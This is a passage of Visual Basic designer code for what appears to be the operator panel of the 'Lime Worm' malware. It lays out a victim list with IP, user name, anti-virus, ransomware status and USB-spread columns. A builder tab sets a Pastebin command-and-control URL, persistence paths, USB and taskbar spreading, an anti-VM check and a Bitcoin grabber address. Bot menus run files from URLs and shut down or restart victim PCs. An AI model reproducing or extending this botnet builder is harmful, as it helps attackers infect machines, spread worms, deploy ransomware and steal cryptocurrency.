        Me.Flag.Images.SetKeyName(209, "sy.png")
        Me.Flag.Images.SetKeyName(210, "sz.png")
        Me.Flag.Images.SetKeyName(211, "tc.png")
        Me.Flag.Images.SetKeyName(212, "td.png")
        Me.Flag.Images.SetKeyName(213, "tg.png")
        Me.Flag.Images.SetKeyName(214, "th.png")
        Me.Flag.Images.SetKeyName(215, "tj.png")
        Me.Flag.Images.SetKeyName(216, "tl.png")
        Me.Flag.Images.SetKeyName(217, "tm.png")
        Me.Flag.Images.SetKeyName(218, "tn.png")
        Me.Flag.Images.SetKeyName(219, "to.png")
        Me.Flag.Images.SetKeyName(220, "tr.png")
        Me.Flag.Images.SetKeyName(221, "tt.png")
        Me.Flag.Images.SetKeyName(222, "tv.png")
        Me.Flag.Images.SetKeyName(223, "tw.png")
        Me.Flag.Images.SetKeyName(224, "tz.png")
        Me.Flag.Images.SetKeyName(225, "ua.png")
        Me.Flag.Images.SetKeyName(226, "ug.png")
        Me.Flag.Images.SetKeyName(227, "us.png")
        Me.Flag.Images.SetKeyName(228, "uy.png")
        Me.Flag.Images.SetKeyName(229, "uz.png")
        Me.Flag.Images.SetKeyName(230, "va.png")
        Me.Flag.Images.SetKeyName(231, "vc.png")
        Me.Flag.Images.SetKeyName(232, "ve.png")
        Me.Flag.Images.SetKeyName(233, "vg.png")
        Me.Flag.Images.SetKeyName(234, "vi.png")
        Me.Flag.Images.SetKeyName(235, "vn.png")
        Me.Flag.Images.SetKeyName(236, "vu.png")
        Me.Flag.Images.SetKeyName(237, "ws.png")
        Me.Flag.Images.SetKeyName(238, "ye.png")
        Me.Flag.Images.SetKeyName(239, "za.png")
        Me.Flag.Images.SetKeyName(240, "zm.png")
        Me.Flag.Images.SetKeyName(241, "zw.png")
        Me.Flag.Images.SetKeyName(242, "--.png")
        '
        'BackgroundWorker1
        '
        '
        'BackgroundWorker2
        '
        '
        'MAIN_TAB
        '
        Me.MAIN_TAB.Controls.Add(Me.TabPage1)
        Me.MAIN_TAB.Controls.Add(Me.TabPage2)
        Me.MAIN_TAB.Controls.Add(Me.TabPage3)
        Me.MAIN_TAB.Dock = System.Windows.Forms.DockStyle.Fill
        Me.MAIN_TAB.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.MAIN_TAB.GlowColor = System.Drawing.Color.Empty
        Me.MAIN_TAB.ItemSize = New System.Drawing.Size(80, 30)
        Me.MAIN_TAB.Location = New System.Drawing.Point(0, 0)
        Me.MAIN_TAB.Name = "MAIN_TAB"
        Me.MAIN_TAB.SelectedIndex = 0
        Me.MAIN_TAB.Size = New System.Drawing.Size(1772, 516)
        Me.MAIN_TAB.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.Black
        Me.TabPage1.Controls.Add(Me.PictureBox1)
        Me.TabPage1.Controls.Add(Me.StatusStrip1)
        Me.TabPage1.Controls.Add(Me.L1)
        Me.TabPage1.Location = New System.Drawing.Point(4, 34)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(1764, 478)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Worms"
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Black
        Me.PictureBox1.ErrorImage = Nothing
        Me.PictureBox1.InitialImage = Nothing
        Me.PictureBox1.Location = New System.Drawing.Point(1509, 314)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(247, 128)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 2
        Me.PictureBox1.TabStop = False
        Me.PictureBox1.Visible = False
        '
        'StatusStrip1
        '
        Me.StatusStrip1.BackColor = System.Drawing.Color.Black
        Me.StatusStrip1.ImageScalingSize = New System.Drawing.Size(24, 24)
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusLabel3, Me.ToolStripStatusLabel1, Me.ToolStripStatusLabel2})
        Me.StatusStrip1.Location = New System.Drawing.Point(3, 445)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Size = New System.Drawing.Size(1758, 30)
        Me.StatusStrip1.SizingGrip = False
        Me.StatusStrip1.TabIndex = 1
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusLabel3
        '
        Me.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.Lime
        Me.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3"
        Me.ToolStripStatusLabel3.Size = New System.Drawing.Size(24, 25)
        Me.ToolStripStatusLabel3.Text = "..."
        '
        'ToolStripStatusLabel1
        '
        Me.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Lime
        Me.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1"
        Me.ToolStripStatusLabel1.Size = New System.Drawing.Size(24, 25)
        Me.ToolStripStatusLabel1.Text = "..."
        '
        'ToolStripStatusLabel2
        '
        Me.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Lime
        Me.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2"
        Me.ToolStripStatusLabel2.Size = New System.Drawing.Size(206, 25)
        Me.ToolStripStatusLabel2.Text = Global.Server_0._5.My.MySettings.Default.Noti
        '
        'L1
        '
        Me.L1.AutoArrange = False
        Me.L1.BackColor = System.Drawing.Color.Black
        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.Country, Me.IP, Me.ID, Me.USER, Me.EXE_NAME, Me.VER, Me.OS, Me.INDATE, Me.AV, Me.Rans, Me.USB, Me.PING})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L1.ForeColor = System.Drawing.Color.Lime
        Me.L1.FullRowSelect = True
        Me.L1.Location = New System.Drawing.Point(3, 3)
        Me.L1.Name = "L1"
        Me.L1.OwnerDraw = True
        Me.L1.Size = New System.Drawing.Size(1758, 472)
        Me.L1.SmallImageList = Me.Flag
        Me.L1.TabIndex = 0
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'Country
        '
        Me.Country.Text = "Country"
        '
        'IP
        '
        Me.IP.Text = " IP Address "
        Me.IP.Width = 132
        '
        'ID
        '
        Me.ID.Text = " User ID "
        Me.ID.Width = 184
        '
        'USER
        '
        Me.USER.Text = " User Name "
        Me.USER.Width = 127
        '
        'EXE_NAME
        '
        Me.EXE_NAME.Text = " File Name "
        '
        'VER
        '
        Me.VER.Text = " Version "
        '
        'OS
        '
        Me.OS.Text = " Operating System "
        Me.OS.Width = 200
        '
        'INDATE
        '
        Me.INDATE.Text = " Installation Date "
        Me.INDATE.Width = 164
        '
        'AV
        '
        Me.AV.Text = " Anti-Virus "
        '
        'Rans
        '
        Me.Rans.Text = " Ransomware Status "
        Me.Rans.Width = 205
        '
        'USB
        '
        Me.USB.Text = " USB Spread "
        '
        'PING
        '
        Me.PING.Text = " Ping "
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.Black
        Me.TabPage2.Controls.Add(Me.L2)
        Me.TabPage2.Location = New System.Drawing.Point(4, 34)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(1764, 478)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Logs"
        '
        'L2
        '
        Me.L2.BackColor = System.Drawing.Color.Black
        Me.L2.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.L2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.L2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.L2.Font = New System.Drawing.Font("Palatino Linotype", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.L2.ForeColor = System.Drawing.Color.Lime
        Me.L2.FormattingEnabled = True
        Me.L2.ItemHeight = 22
        Me.L2.Items.AddRange(New Object() {"#Lime_Worm"})
        Me.L2.Location = New System.Drawing.Point(3, 3)
        Me.L2.Name = "L2"
        Me.L2.Size = New System.Drawing.Size(1758, 472)
        Me.L2.TabIndex = 0
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.Black
        Me.TabPage3.Controls.Add(Me.ChGroupBox4)
        Me.TabPage3.Controls.Add(Me.ChSeparator1)
        Me.TabPage3.Controls.Add(Me.ChButton1)
        Me.TabPage3.Controls.Add(Me.ChGroupBox3)
        Me.TabPage3.Controls.Add(Me.ChGroupBox2)
        Me.TabPage3.Controls.Add(Me.ChGroupBox1)
        Me.TabPage3.Location = New System.Drawing.Point(4, 34)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(1764, 478)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Builder"
        '
        'ChGroupBox4
        '
        Me.ChGroupBox4.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox4.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox4.Controls.Add(Me.Icon_OFF)
        Me.ChGroupBox4.Controls.Add(Me.Icon_Box)
        Me.ChGroupBox4.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox4.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox4.Image = Nothing
        Me.ChGroupBox4.Location = New System.Drawing.Point(1239, 20)
        Me.ChGroupBox4.Movable = True
        Me.ChGroupBox4.Name = "ChGroupBox4"
        Me.ChGroupBox4.NoRounding = False
        Me.ChGroupBox4.Sizable = True
        Me.ChGroupBox4.Size = New System.Drawing.Size(169, 270)
        Me.ChGroupBox4.SmartBounds = True
        Me.ChGroupBox4.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox4.TabIndex = 10
        Me.ChGroupBox4.Text = "Icon"
        Me.ChGroupBox4.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox4.Transparent = False
        '
        'Icon_OFF
        '
        Me.Icon_OFF.Checked = False
        Me.Icon_OFF.Location = New System.Drawing.Point(20, 50)
        Me.Icon_OFF.MaximumSize = New System.Drawing.Size(80, 24)
        Me.Icon_OFF.MinimumSize = New System.Drawing.Size(80, 24)
        Me.Icon_OFF.Name = "Icon_OFF"
        Me.Icon_OFF.Size = New System.Drawing.Size(80, 24)
        Me.Icon_OFF.TabIndex = 1
        Me.Icon_OFF.Text = "ChOnOffBox1"
        '
        'Icon_Box
        '
        Me.Icon_Box.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Icon_Box.Location = New System.Drawing.Point(20, 91)
        Me.Icon_Box.Name = "Icon_Box"
        Me.Icon_Box.Size = New System.Drawing.Size(128, 128)
        Me.Icon_Box.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.Icon_Box.TabIndex = 0
        Me.Icon_Box.TabStop = False
        '
        'ChSeparator1
        '
        Me.ChSeparator1.Colors = New Server_0._5.Bloom(-1) {}
        Me.ChSeparator1.Customization = ""
        Me.ChSeparator1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChSeparator1.Image = Nothing
        Me.ChSeparator1.Location = New System.Drawing.Point(25, 377)
        Me.ChSeparator1.Name = "ChSeparator1"
        Me.ChSeparator1.NoRounding = False
        Me.ChSeparator1.Size = New System.Drawing.Size(1383, 23)
        Me.ChSeparator1.TabIndex = 9
        Me.ChSeparator1.Text = "ChSeparator1"
        Me.ChSeparator1.Transparent = False
        '
        'ChButton1
        '
        Me.ChButton1.Customization = "AGQA/wD/AP8AgAD/"
        Me.ChButton1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChButton1.Image = Nothing
        Me.ChButton1.Location = New System.Drawing.Point(25, 305)
        Me.ChButton1.Name = "ChButton1"
        Me.ChButton1.NoRounding = False
        Me.ChButton1.Size = New System.Drawing.Size(1383, 54)
        Me.ChButton1.TabIndex = 8
        Me.ChButton1.Text = "B u i l d"
        Me.ChButton1.Transparent = False
        '
        'ChGroupBox3
        '
        Me.ChGroupBox3.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox3.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox3.Controls.Add(Me.PIN_CHK)
        Me.ChGroupBox3.Controls.Add(Me.Label7)
        Me.ChGroupBox3.Controls.Add(Me.BTC_ADDR)
        Me.ChGroupBox3.Controls.Add(Me.ANTI)
        Me.ChGroupBox3.Controls.Add(Me.USB_CHK)
        Me.ChGroupBox3.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox3.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox3.Image = Nothing
        Me.ChGroupBox3.Location = New System.Drawing.Point(837, 20)
        Me.ChGroupBox3.Movable = True
        Me.ChGroupBox3.Name = "ChGroupBox3"
        Me.ChGroupBox3.NoRounding = False
        Me.ChGroupBox3.Sizable = True
        Me.ChGroupBox3.Size = New System.Drawing.Size(371, 270)
        Me.ChGroupBox3.SmartBounds = True
        Me.ChGroupBox3.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox3.TabIndex = 7
        Me.ChGroupBox3.Text = "MISC"
        Me.ChGroupBox3.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox3.Transparent = False
        '
        'PIN_CHK
        '
        Me.PIN_CHK.BackColor = System.Drawing.Color.Transparent
        Me.PIN_CHK.Checked = False
        Me.PIN_CHK.ForeColor = System.Drawing.Color.Black
        Me.PIN_CHK.Location = New System.Drawing.Point(19, 148)
        Me.PIN_CHK.Name = "PIN_CHK"
        Me.PIN_CHK.Size = New System.Drawing.Size(349, 14)
        Me.PIN_CHK.TabIndex = 7
        Me.PIN_CHK.Text = "Spread [Pinned TaskBar Applications]"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.BackColor = System.Drawing.Color.Black
        Me.Label7.ForeColor = System.Drawing.Color.Lime
        Me.Label7.Location = New System.Drawing.Point(16, 187)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(205, 18)
        Me.Label7.TabIndex = 10
        Me.Label7.Text = "Bitcoin Grabber Address"
        '
        'BTC_ADDR
        '
        Me.BTC_ADDR.BackColor = System.Drawing.Color.Transparent
        Me.BTC_ADDR.Colors = New Server_0._5.Bloom(-1) {}
        Me.BTC_ADDR.Customization = ""
        Me.BTC_ADDR.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "BTC", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.BTC_ADDR.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.BTC_ADDR.Image = Nothing
        Me.BTC_ADDR.Location = New System.Drawing.Point(19, 217)
        Me.BTC_ADDR.MaxCharacters = 0
        Me.BTC_ADDR.Name = "BTC_ADDR"
        Me.BTC_ADDR.NoRounding = False
        Me.BTC_ADDR.Size = New System.Drawing.Size(335, 25)
        Me.BTC_ADDR.TabIndex = 9
        Me.BTC_ADDR.Text = Global.Server_0._5.My.MySettings.Default.BTC
        Me.BTC_ADDR.Transparent = True
        Me.BTC_ADDR.UsePasswordMask = False
        '
        'ANTI
        '
        Me.ANTI.BackColor = System.Drawing.Color.Transparent
        Me.ANTI.Checked = False
        Me.ANTI.ForeColor = System.Drawing.Color.Black
        Me.ANTI.Location = New System.Drawing.Point(19, 63)
        Me.ANTI.Name = "ANTI"
        Me.ANTI.Size = New System.Drawing.Size(214, 14)
        Me.ANTI.TabIndex = 8
        Me.ANTI.Text = "Anti Virtual Machine"
        '
        'USB_CHK
        '
        Me.USB_CHK.BackColor = System.Drawing.Color.Transparent
        Me.USB_CHK.Checked = False
        Me.USB_CHK.ForeColor = System.Drawing.Color.Black
        Me.USB_CHK.Location = New System.Drawing.Point(19, 106)
        Me.USB_CHK.Name = "USB_CHK"
        Me.USB_CHK.Size = New System.Drawing.Size(214, 14)
        Me.USB_CHK.TabIndex = 7
        Me.USB_CHK.Text = "Spread [USB]"
        '
        'ChGroupBox2
        '
        Me.ChGroupBox2.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox2.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox2.Controls.Add(Me.DROP)
        Me.ChGroupBox2.Controls.Add(Me.PATH2)
        Me.ChGroupBox2.Controls.Add(Me.Label5)
        Me.ChGroupBox2.Controls.Add(Me.PATH1)
        Me.ChGroupBox2.Controls.Add(Me.Label3)
        Me.ChGroupBox2.Controls.Add(Me.EXE)
        Me.ChGroupBox2.Controls.Add(Me.Label4)
        Me.ChGroupBox2.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox2.Image = Nothing
        Me.ChGroupBox2.Location = New System.Drawing.Point(431, 20)
        Me.ChGroupBox2.Movable = True
        Me.ChGroupBox2.Name = "ChGroupBox2"
        Me.ChGroupBox2.NoRounding = False
        Me.ChGroupBox2.Sizable = True
        Me.ChGroupBox2.Size = New System.Drawing.Size(371, 270)
        Me.ChGroupBox2.SmartBounds = True
        Me.ChGroupBox2.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox2.TabIndex = 5
        Me.ChGroupBox2.Text = "Persistence"
        Me.ChGroupBox2.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox2.Transparent = False
        '
        'DROP
        '
        Me.DROP.Checked = False
        Me.DROP.Location = New System.Drawing.Point(19, 50)
        Me.DROP.MaximumSize = New System.Drawing.Size(80, 24)
        Me.DROP.MinimumSize = New System.Drawing.Size(80, 24)
        Me.DROP.Name = "DROP"
        Me.DROP.Size = New System.Drawing.Size(80, 24)
        Me.DROP.TabIndex = 6
        Me.DROP.Text = "ChOnOffBox2"
        '
        'PATH2
        '
        Me.PATH2.BackColor = System.Drawing.Color.Transparent
        Me.PATH2.Colors = New Server_0._5.Bloom(-1) {}
        Me.PATH2.Customization = ""
        Me.PATH2.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "path2", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.PATH2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.PATH2.Image = Nothing
        Me.PATH2.Location = New System.Drawing.Point(112, 180)
        Me.PATH2.MaxCharacters = 0
        Me.PATH2.Name = "PATH2"
        Me.PATH2.NoRounding = False
        Me.PATH2.Size = New System.Drawing.Size(241, 25)
        Me.PATH2.TabIndex = 0
        Me.PATH2.Text = Global.Server_0._5.My.MySettings.Default.path2
        Me.PATH2.Transparent = True
        Me.PATH2.UsePasswordMask = False
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.ForeColor = System.Drawing.Color.Lime
        Me.Label5.Location = New System.Drawing.Point(16, 187)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(94, 18)
        Me.Label5.TabIndex = 5
        Me.Label5.Text = "Sub Folder"
        '
        'PATH1
        '
        Me.PATH1.BackColor = System.Drawing.Color.Black
        Me.PATH1.BaseColour = System.Drawing.Color.Black
        Me.PATH1.BorderColour = System.Drawing.Color.DarkGreen
        Me.PATH1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.PATH1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.PATH1.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.PATH1.FontColour = System.Drawing.Color.Lime
        Me.PATH1.FormattingEnabled = True
        Me.PATH1.Items.AddRange(New Object() {"AppData", "Temp", "UserProfile"})
        Me.PATH1.Location = New System.Drawing.Point(112, 138)
        Me.PATH1.Name = "PATH1"
        Me.PATH1.Size = New System.Drawing.Size(176, 29)
        Me.PATH1.StartIndex = 0
        Me.PATH1.TabIndex = 4
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.ForeColor = System.Drawing.Color.Lime
        Me.Label3.Location = New System.Drawing.Point(16, 98)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(90, 18)
        Me.Label3.TabIndex = 3
        Me.Label3.Text = "File Name"
        '
        'EXE
        '
        Me.EXE.BackColor = System.Drawing.Color.Transparent
        Me.EXE.Colors = New Server_0._5.Bloom(-1) {}
        Me.EXE.Customization = ""
        Me.EXE.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "exe", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.EXE.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.EXE.Image = Nothing
        Me.EXE.Location = New System.Drawing.Point(112, 91)
        Me.EXE.MaxCharacters = 0
        Me.EXE.Name = "EXE"
        Me.EXE.NoRounding = False
        Me.EXE.Size = New System.Drawing.Size(240, 25)
        Me.EXE.TabIndex = 2
        Me.EXE.Text = Global.Server_0._5.My.MySettings.Default.exe
        Me.EXE.Transparent = True
        Me.EXE.UsePasswordMask = False
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.ForeColor = System.Drawing.Color.Lime
        Me.Label4.Location = New System.Drawing.Point(16, 144)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(81, 18)
        Me.Label4.TabIndex = 1
        Me.Label4.Text = "Directory"
        '
        'ChGroupBox1
        '
        Me.ChGroupBox1.BackColor = System.Drawing.Color.Black
        Me.ChGroupBox1.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.ChGroupBox1.Controls.Add(Me.ChButton2)
        Me.ChGroupBox1.Controls.Add(Me.Label9)
        Me.ChGroupBox1.Controls.Add(Me.Label6)
        Me.ChGroupBox1.Controls.Add(Me.Label2)
        Me.ChGroupBox1.Controls.Add(Me.Label1)
        Me.ChGroupBox1.Controls.Add(Me.Pastebin)
        Me.ChGroupBox1.Customization = "AGQA/wAAAP8A/wD/"
        Me.ChGroupBox1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChGroupBox1.Image = Nothing
        Me.ChGroupBox1.Location = New System.Drawing.Point(25, 20)
        Me.ChGroupBox1.Movable = True
        Me.ChGroupBox1.Name = "ChGroupBox1"
        Me.ChGroupBox1.NoRounding = False
        Me.ChGroupBox1.Sizable = True
        Me.ChGroupBox1.Size = New System.Drawing.Size(371, 270)
        Me.ChGroupBox1.SmartBounds = True
        Me.ChGroupBox1.StartPosition = System.Windows.Forms.FormStartPosition.Manual
        Me.ChGroupBox1.TabIndex = 4
        Me.ChGroupBox1.Text = "Connection"
        Me.ChGroupBox1.TransparencyKey = System.Drawing.Color.Empty
        Me.ChGroupBox1.Transparent = False
        '
        'ChButton2
        '
        Me.ChButton2.Customization = "AGQA/wD/AP8AgAD/"
        Me.ChButton2.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.ChButton2.Image = Nothing
        Me.ChButton2.Location = New System.Drawing.Point(257, 50)
        Me.ChButton2.Name = "ChButton2"
        Me.ChButton2.NoRounding = False
        Me.ChButton2.Size = New System.Drawing.Size(92, 27)
        Me.ChButton2.TabIndex = 10
        Me.ChButton2.Text = "Check"
        Me.ChButton2.Transparent = False
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.ForeColor = System.Drawing.Color.Lime
        Me.Label9.Location = New System.Drawing.Point(16, 154)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(148, 18)
        Me.Label9.TabIndex = 5
        Me.Label9.Text = "YourIP:YourPORT"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.ForeColor = System.Drawing.SystemColors.Control
        Me.Label6.Location = New System.Drawing.Point(16, 180)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(133, 18)
        Me.Label6.TabIndex = 3
        Me.Label6.Text = "127.0.0.1:5554"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.ForeColor = System.Drawing.Color.Lime
        Me.Label2.Location = New System.Drawing.Point(16, 130)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(84, 18)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "Example:"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.Lime
        Me.Label1.Location = New System.Drawing.Point(16, 62)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(162, 18)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Pastebin RAW URL"
        '
        'Pastebin
        '
        Me.Pastebin.BackColor = System.Drawing.Color.Transparent
        Me.Pastebin.Colors = New Server_0._5.Bloom(-1) {}
        Me.Pastebin.Customization = ""
        Me.Pastebin.DataBindings.Add(New System.Windows.Forms.Binding("Text", Global.Server_0._5.My.MySettings.Default, "host", True, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged))
        Me.Pastebin.Font = New System.Drawing.Font("Verdana", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Pastebin.Image = Nothing
        Me.Pastebin.Location = New System.Drawing.Point(19, 83)
        Me.Pastebin.MaxCharacters = 0
        Me.Pastebin.Name = "Pastebin"
        Me.Pastebin.NoRounding = False
        Me.Pastebin.Size = New System.Drawing.Size(330, 25)
        Me.Pastebin.TabIndex = 0
        Me.Pastebin.Text = Global.Server_0._5.My.MySettings.Default.host
        Me.Pastebin.Transparent = True
        Me.Pastebin.UsePasswordMask = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(9.0!, 20.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(1772, 516)
        Me.Controls.Add(Me.MAIN_TAB)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.Text = "Form1"
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.MAIN_TAB.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.ChGroupBox4.ResumeLayout(False)
        CType(Me.Icon_Box, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ChGroupBox3.ResumeLayout(False)
        Me.ChGroupBox3.PerformLayout()
        Me.ChGroupBox2.ResumeLayout(False)
        Me.ChGroupBox2.PerformLayout()
        Me.ChGroupBox1.ResumeLayout(False)
        Me.ChGroupBox1.PerformLayout()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents MAIN_TAB As CHTabcontrol
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents L1 As ListView
    Friend WithEvents ID As ColumnHeader
    Friend WithEvents IP As ColumnHeader
    Friend WithEvents ContextMenuStrip1 As ContextMenuStrip
    Friend WithEvents USER As ColumnHeader
    Friend WithEvents OS As ColumnHeader
    Friend WithEvents INDATE As ColumnHeader
    Friend WithEvents ControllerOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UpdateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RunAFileToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FromURLToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents Rans As ColumnHeader
    Friend WithEvents L2 As ListBox
    Friend WithEvents Timer1 As Timer
    Friend WithEvents StatusStrip1 As StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As ToolStripStatusLabel
    Friend WithEvents NotifyIcon1 As NotifyIcon
    Friend WithEvents PING As ColumnHeader
    Friend WithEvents VER As ColumnHeader
    Friend WithEvents EXE_NAME As ColumnHeader
    Friend WithEvents AboutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents BotColorToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BotPCOptionsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCRestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCShutdownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PCLogoutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents USB As ColumnHeader
    Friend WithEvents AV As ColumnHeader
    Friend WithEvents TabPage3 As TabPage
    Friend WithEvents ChGroupBox1 As CHGroupBox
    Friend WithEvents Label1 As Label
    Friend WithEvents Pastebin As CHTextbox
    Friend WithEvents ChGroupBox2 As CHGroupBox
    Friend WithEvents PATH2 As CHTextbox
    Friend WithEvents Label5 As Label
    Friend WithEvents PATH1 As CHCombobox
    Friend WithEvents Label3 As Label
    Friend WithEvents EXE As CHTextbox
    Friend WithEvents Label4 As Label
    Friend WithEvents ChGroupBox3 As CHGroupBox
    Friend WithEvents ANTI As CHCheckbox
    Friend WithEvents USB_CHK As CHCheckbox
